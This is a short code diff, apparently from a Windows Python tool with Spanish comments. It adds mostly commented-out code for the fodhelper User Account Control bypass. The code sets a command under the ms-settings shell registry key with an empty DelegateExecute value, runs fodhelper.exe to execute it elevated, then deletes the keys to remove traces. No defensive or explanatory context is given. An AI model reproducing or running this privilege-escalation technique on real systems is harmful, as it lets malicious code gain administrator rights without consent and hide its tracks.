@@ -1,0 +1,26 @@
+     # Comando directo sin cmd.exe
+            # commands = target_path  # Ejecuta directamente el archivo sin consola
+
+            # # Modifica el registro para que FODHELPER ejecute el script
+            # reg_path = r"Software\Classes\ms-settings\shell\open\command"
+            # with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as key:
+            #     winreg.SetValueEx(key, None, 0, winreg.REG_SZ, commands)
+            #     winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+
+            # Ejecuta FODHELPER
+            # os.system(CMD)  # Usar Popen para no bloquear el script principal
+
+            # # Limpia el registro después de ejecutar FODHELPER
+            # time.sleep(2)  # Espera un momento para que el comando se ejecute
+            # with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE) as key:
+            #     winreg.DeleteValue(key, "DelegateExecute")
+            # winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)
+
+            # Termina el proceso actual
+            #sys.exit(0)
+
+# FOD_HELPER = "C:\\Windows\\System32\\fodhelper.exe"
+CMD = "cmd.exe"
+PYTHON_CMD = sys.executable  # Usar el intérprete Python actual
+# REG_PATH              = 'Software\Classes\ms-settings\shell\open\command'
+# DELEGATE_EXEC_REG_KEY = 'DelegateExecute'
